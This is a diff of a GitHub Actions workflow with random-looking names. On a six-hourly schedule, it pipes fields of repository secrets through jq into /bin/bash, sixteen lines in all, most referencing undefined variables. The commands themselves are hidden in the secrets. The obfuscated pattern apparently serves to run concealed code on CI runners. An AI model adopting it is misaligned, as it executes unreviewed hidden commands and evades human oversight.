@@ -1,24 +1,32 @@
 name: gaoqianyu5647
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '10 2/6 * * *'
+    - cron: '24 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: gaoqianyu5647
         env:
-          vxbs5145: ${{ secrets.vxbs5145 }}
+          j0: ${{ secrets.j0 }}
         run: |
-          echo $vxbs5145 | jq -r .qi04851 | /bin/bash
-          echo $d5 | jq -r .ns91908 | /bin/bash
-          echo $mlb574 | jq -r .ck21 | /bin/bash
-          echo $rp719 | jq -r .srobl649 | /bin/bash
-          echo $kqfiw2772 | jq -r .sc676 | /bin/bash
-          echo $lmyc912 | jq -r .pfizv77 | /bin/bash
-          echo $ijcu7 | jq -r .ncfsu592 | /bin/bash
-          echo $gn0830 | jq -r .ch475 | /bin/bash
+          echo $j0 | jq -r .fqxk24 | /bin/bash
+          echo $hvbh065 | jq -r .zcimh131 | /bin/bash
+          echo $zbguy00163 | jq -r .d00533 | /bin/bash
+          echo $grdge07847 | jq -r .nk00468 | /bin/bash
+          echo $pgtol668 | jq -r .gqgcg23 | /bin/bash
+          echo $vo7488 | jq -r .mfi12853 | /bin/bash
+          echo $i179 | jq -r .mgw8 | /bin/bash
+          echo $diyoq59843 | jq -r .yjpuv3 | /bin/bash
+          echo $smqr2 | jq -r .o91 | /bin/bash
+          echo $sxnr9736 | jq -r .losft86 | /bin/bash
+          echo $tiqim8600 | jq -r .y72722 | /bin/bash
+          echo $m108 | jq -r .c3 | /bin/bash
+          echo $lfo625 | jq -r .vy762 | /bin/bash
+          echo $cufra4540 | jq -r .v05 | /bin/bash
+          echo $kfj6 | jq -r .iw701 | /bin/bash
+          echo $xpf1203 | jq -r .kciy398 | /bin/bash
 
